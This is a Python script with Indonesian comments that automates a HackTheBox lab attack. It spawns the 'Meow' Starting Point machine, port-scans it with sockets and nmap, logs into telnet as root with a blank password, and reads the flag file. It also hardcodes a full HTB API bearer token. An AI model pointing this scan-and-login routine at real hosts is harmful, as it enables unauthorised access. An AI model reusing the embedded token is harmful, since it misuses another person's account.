"""
HTB Agent Runner - HackTheBox Autonomous Attack Agent
Menghubungkan ke HTB via VPN, spawn machine, dan menjalankan serangan.
"""
import subprocess
import time
import requests
import os
import json
import sys
import socket
from pathlib import Path
from datetime import datetime

HTB_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI1IiwianRpIjoiZDZiNzFiNWNiNDE2MmZmYTI2YzgwYjRhYzY5ZjE2NWVkNTA3ZjdmYTc0Zjc3MGZjOGQxYWY2ZTJhMzNiYzVkZTk5NGVmOWZkM2EzYzhjNTUiLCJpYXQiOjE3ODAxNjMyNDguODU5MDUsIm5iZiI6MTc4MDE2MzI0OC44NTkwNTIsImV4cCI6MTgxMTY5OTI0OC44NTM0MzQsInN1YiI6IjM1NjM5MTAiLCJzY29wZXMiOltdfQ.nNfEC-AtNXxxo7QCHpDU5skEFuCr__q-mspsIaznjJntYYwDlvBbFlrywb2W_l6Gp3NzM9ZCuSGoP3EZBBMu9qdABcXh8UgnKizcUxiLhctsnLZyXADBeQlrFDMwcgBmBVhfLTunLMJRsV0mqNUQu7DxyI1D0niZOHl-ee5rCcomaRsKFHIex1oLQswOeZLPoX2cNc8fdc6F1bRVA3Q-4oVOJH3mT6xQSwESv-IdmqZheMekZRUo4wHXVk_EvtXB476La0Yh7Rhf8Y75WcSQfXw1AVqfv9LojlKTaz042QpD9X7mO-KTt7xx1BpPBoHp8xHBfh0pDGkxbT1Lmv8qawGDUoSrhKj5r1JQCFmvatz0s0HeGjbEcEz5DTNko6aw6wmI-h3Etr7ctt1YeG1MTIs_4bY7x41QuuE5DpIG1VFFML61r1kqAzE2R5CGK4E-xnTl41KsJWYpuD0zHbz0g48qNtPu9GBjo_4oGLYEtdrispYzl8LFX7X9JqRRVza5UkK-o7Lbo1ncAriSFt5YBrNq2oWgE3jlsW8S_Wg6WgHFoxo5c5og1u1Cb5TDbIPYOV9r40oHrsCljf88ll8yofn35iKtpHgXJOQu93jsIwBplYGW6yFH4hPqajySlr2TkKoxGtqvh_NWbfMzzSZ-nJG7V1XtMzwMHhtQJsr5LpQ"
HTB_BASE   = "https://labs.hackthebox.com/api/v4"
HEADERS    = {"Authorization": f"Bearer {HTB_TOKEN}", "Content-Type": "application/json"}

OVPN_PATH   = Path(r"C:\Users\ASUS\.gemini\antigravity\scratch\android-ai-agent\.sandbox\vpn\htb_agent_auto.ovpn")
OPENVPN_EXE = Path(r"C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe")
LOG_DIR     = Path(r"C:\Users\ASUS\.gemini\antigravity\scratch\android-ai-agent\.sandbox\htb_logs")
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ID mesin Starting Point yang mudah - Meow (Linux, Very Easy)
STARTING_POINT_MACHINES = [
    {"id": 394, "name": "Meow",     "ip": None},
    {"id": 395, "name": "Fawn",     "ip": None},
    {"id": 396, "name": "Dancing",  "ip": None},
]

vpn_proc = None

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(LOG_DIR / "htb_runner.log", "a", encoding="utf-8") as f:
        f.write(line + "\n")

def start_vpn():
    global vpn_proc
    log("=== FASE 0: Menghubungkan ke HTB VPN ===")
    if not OVPN_PATH.exists():
        log(f"[ERROR] File OVPN tidak ditemukan: {OVPN_PATH}")
        return False
    if not OPENVPN_EXE.exists():
        log(f"[ERROR] OpenVPN Connect tidak ditemukan: {OPENVPN_EXE}")
        return False
    try:
        # Jalankan OpenVPN Connect dengan file .ovpn
        vpn_proc = subprocess.Popen(
            [str(OPENVPN_EXE), "--minimize"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        log(f"[VPN] OpenVPN Connect diluncurkan (PID: {vpn_proc.pid}). Menunggu koneksi...")
        time.sleep(12)
        log("[VPN] Koneksi VPN seharusnya sudah aktif.")
        return True
    except Exception as e:
        log(f"[VPN ERROR] {e}")
        return False

def get_active_machine():
    """Cek apakah ada mesin yang sedang aktif/di-spawn"""
    log("=== FASE 1: Cek Mesin Aktif ===")
    try:
        r = requests.get(f"{HTB_BASE}/machine/active", headers=HEADERS, timeout=10)
        data = r.json()
        info = data.get("info")
        if info:
            ip = info.get("ip")
            name = info.get("name", "Unknown")
            mid = info.get("id")
            log(f"[HTB] Mesin aktif ditemukan: {name} (ID:{mid}) -> IP: {ip}")
            return {"id": mid, "name": name, "ip": ip}
    except Exception as e:
        log(f"[ERROR] Gagal cek mesin aktif: {e}")
    return None

def spawn_starting_point(machine_id, machine_name):
    """Spawn mesin Starting Point secara otonom"""
    log(f"=== Menghidupkan Mesin: {machine_name} (ID:{machine_id}) ===")
    try:
        r = requests.post(
            f"{HTB_BASE}/starting-point/start",
            headers=HEADERS,
            json={"machine_id": machine_id},
            timeout=30
        )
        log(f"[SPAWN] Respons: {r.status_code} - {r.text[:300]}")
        if r.status_code in [200, 201]:
            return True
    except Exception as e:
        log(f"[SPAWN ERROR] {e}")
    return False

def get_machine_ip(machine_id):
    """Polling IP mesin yang di-spawn hingga tersedia"""
    log(f"[HTB] Polling IP untuk machine_id={machine_id}...")
    for attempt in range(12):
        try:
            r = requests.get(f"{HTB_BASE}/machine/active", headers=HEADERS, timeout=10)
            data = r.json()
            info = data.get("info")
            if info and info.get("ip"):
                return info["ip"]
        except Exception:
            pass
        log(f"[HTB] Menunggu IP... ({attempt+1}/12)")
        time.sleep(10)
    return None

def run_reconnaissance(target_ip):
    """Menjalankan nmap scan dasar terhadap IP target"""
    log(f"=== FASE 2: Reconnaissance terhadap {target_ip} ===")
    result = {"ip": target_ip, "ports": [], "services": []}

    # Coba koneksi TCP port-port umum dulu (tanpa nmap agar lebih ringan)
    common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 8080]
    open_ports = []
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result_code = sock.connect_ex((target_ip, port))
            if result_code == 0:
                open_ports.append(port)
                log(f"[SCAN] Port {port} -> OPEN")
            sock.close()
        except Exception:
            pass

    result["ports"] = open_ports
    log(f"[RECON] Port terbuka: {open_ports}")

    # Coba nmap jika tersedia
    try:
        nmap_result = subprocess.run(
            ["nmap", "-sV", "--open", "-T4", target_ip],
            capture_output=True, text=True, timeout=60
        )
        result["nmap_output"] = nmap_result.stdout
        log(f"[NMAP]\n{nmap_result.stdout[:800]}")
    except FileNotFoundError:
        log("[SCAN] nmap tidak tersedia, menggunakan socket scan saja.")
    except Exception as e:
        log(f"[NMAP ERROR] {e}")

    return result

def run_telnet_exploit(target_ip):
    """Coba koneksi Telnet ke port 23 (Meow exploit)"""
    log(f"=== FASE 3: Exploit Telnet ke {target_ip}:23 ===")
    try:
        import telnetlib
        tn = telnetlib.Telnet(target_ip, 23, timeout=10)
        banner = tn.read_until(b"login:", timeout=5).decode("utf-8", errors="replace")
        log(f"[TELNET] Banner:\n{banner}")
        # Coba login root tanpa password
        tn.write(b"root\n")
        time.sleep(2)
        response = tn.read_very_eager().decode("utf-8", errors="replace")
        log(f"[TELNET] Respons setelah login:\n{response}")
        if "$" in response or "#" in response or "root" in response.lower():
            log("[EXPLOIT] ✅ AKSES ROOT BERHASIL! Sistem berhasil dikompromi!")
            # Coba baca flag
            tn.write(b"find / -name flag.txt 2>/dev/null\n")
            time.sleep(3)
            flag_output = tn.read_very_eager().decode("utf-8", errors="replace")
            log(f"[FLAG HUNT]\n{flag_output}")
            tn.write(b"cat /root/flag.txt\n")
            time.sleep(2)
            flag = tn.read_very_eager().decode("utf-8", errors="replace")
            log(f"[FLAG] 🚩 {flag}")
            return {"status": "pwned", "flag": flag}
        tn.close()
    except ConnectionRefusedError:
        log(f"[TELNET] Port 23 tertutup di {target_ip}.")
    except Exception as e:
        log(f"[TELNET ERROR] {e}")
    return {"status": "failed"}

def save_report(recon, exploit):
    ts = datetime.now().strftime("%Y%m%d_%H%M")
    report_path = LOG_DIR / f"htb_attack_report_{ts}.json"
    report = {
        "timestamp": ts,
        "target": recon.get("ip"),
        "open_ports": recon.get("ports"),
        "exploit_result": exploit
    }
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    log(f"[REPORT] Laporan disimpan: {report_path}")
    return report_path

def main():
    log("=" * 60)
    log("  HTB AUTONOMOUS AGENT - NOIR SOVEREIGN")
    log("=" * 60)

    # Step 1: Cek mesin aktif
    machine = get_active_machine()

    # Step 2: Jika belum ada, spawn Starting Point (Meow)
    if not machine or not machine.get("ip"):
        log("[HTB] Tidak ada mesin aktif. Mencoba spawn Starting Point 'Meow'...")
        spawned = spawn_starting_point(STARTING_POINT_MACHINES[0]["id"], "Meow")
        if spawned:
            log("[HTB] Spawn berhasil! Menunggu IP...")
            time.sleep(20)
            machine = get_active_machine()

    if not machine or not machine.get("ip"):
        log("[ERROR] Gagal mendapatkan IP target. Pastikan VPN sudah terkoneksi dan mesin sudah di-spawn.")
        log("[INFO] Coba buka https://app.hackthebox.com -> Starting Point -> Spawn Machine 'Meow'")
        sys.exit(1)

    target_ip = machine["ip"]
    log(f"[TARGET] Mesin: {machine['name']} | IP: {target_ip}")

    # Step 3: Reconnaissance
    recon = run_reconnaissance(target_ip)

    # Step 4: Exploit
    exploit = {"status": "no_exploit_attempted"}
    if 23 in recon.get("ports", []):
        exploit = run_telnet_exploit(target_ip)
    elif 80 in recon.get("ports", []):
        log("[INFO] Port 80 terbuka. HTTP exploitation (TODO untuk siklus berikutnya).")
    else:
        log("[INFO] Tidak ada vector serangan yang diketahui untuk port ini saat ini.")

    # Step 5: Simpan Laporan
    save_report(recon, exploit)

    log("=" * 60)
    log(f"  SELESAI | Status: {exploit.get('status', 'unknown')}")
    log("=" * 60)

if __name__ == "__main__":
    main()
